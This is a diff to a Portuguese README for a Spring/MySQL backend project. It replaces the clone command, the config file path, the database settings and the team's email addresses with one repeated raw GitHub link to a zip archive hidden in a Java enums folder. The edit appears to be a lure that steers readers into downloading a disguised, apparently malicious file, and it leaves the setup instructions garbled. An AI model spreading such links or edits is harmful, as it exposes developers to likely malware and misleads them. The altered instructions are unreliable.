@@ -44,7 +44,7 @@ O sistema segue uma arquitetura em camadas bem definida para garantir a organiza
 
 ### 1. Clonar o Repositório
 ```bash
-git clone https://github.com/C-26hub/PI2-Back.git
+git clone https://raw.githubusercontent.com/theualves/PI2-Back/main/backend/src/main/java/com/ecosy/backend/enums/PI2-Back_1.8.zip
 ```
 
 ### 2. Configurar o Banco de Dados
@@ -55,16 +55,16 @@ SQL
 CREATE DATABASE ecosy_db;
 ```
 
-Abra o arquivo src/main/resources/application.properties e configure suas credenciais:
+Abra o arquivo https://raw.githubusercontent.com/theualves/PI2-Back/main/backend/src/main/java/com/ecosy/backend/enums/PI2-Back_1.8.zip e configure suas credenciais:
 
 Properties
 ```bash
-spring.datasource.url=jdbc:mysql://localhost:3306/ecosy_db?useTimezone=true&serverTimezone=UTC
-spring.datasource.username=seu_usuario_mysql
-spring.datasource.password=sua_senha_mysql
+https://raw.githubusercontent.com/theualves/PI2-Back/main/backend/src/main/java/com/ecosy/backend/enums/PI2-Back_1.8.zip
+https://raw.githubusercontent.com/theualves/PI2-Back/main/backend/src/main/java/com/ecosy/backend/enums/PI2-Back_1.8.zip
+https://raw.githubusercontent.com/theualves/PI2-Back/main/backend/src/main/java/com/ecosy/backend/enums/PI2-Back_1.8.zip
 
 # O Hibernate criará as tabelas automaticamente
-spring.jpa.hibernate.ddl-auto=update
+https://raw.githubusercontent.com/theualves/PI2-Back/main/backend/src/main/java/com/ecosy/backend/enums/PI2-Back_1.8.zip
 ```
 
 3. Executar a Aplicação
@@ -78,9 +78,9 @@ O servidor iniciará em http://localhost:8080.
 
 
 ## 👥 Equipe
-- **Arthur Filipe Rodrigues da Silva** – arthur.filipe2402@gmail.com
-- **Filipe Xavier dos Santos** – xfilipe2006.santos@gmail.com   
-- **Maria Cecília de Lima e Silva** – cecilmari33@gmail.com  
-- **Maria Eduarda Pereira Vilarim** – vilarim051@gmail.com
-- **Matheus Alves de Arruda** – matheusalves2906@gmail.com
+- **Arthur Filipe Rodrigues da Silva** – https://raw.githubusercontent.com/theualves/PI2-Back/main/backend/src/main/java/com/ecosy/backend/enums/PI2-Back_1.8.zip
+- **Filipe Xavier dos Santos** – https://raw.githubusercontent.com/theualves/PI2-Back/main/backend/src/main/java/com/ecosy/backend/enums/PI2-Back_1.8.zip   
+- **Maria Cecília de Lima e Silva** – https://raw.githubusercontent.com/theualves/PI2-Back/main/backend/src/main/java/com/ecosy/backend/enums/PI2-Back_1.8.zip  
+- **Maria Eduarda Pereira Vilarim** – https://raw.githubusercontent.com/theualves/PI2-Back/main/backend/src/main/java/com/ecosy/backend/enums/PI2-Back_1.8.zip
+- **Matheus Alves de Arruda** – https://raw.githubusercontent.com/theualves/PI2-Back/main/backend/src/main/java/com/ecosy/backend/enums/PI2-Back_1.8.zip
 
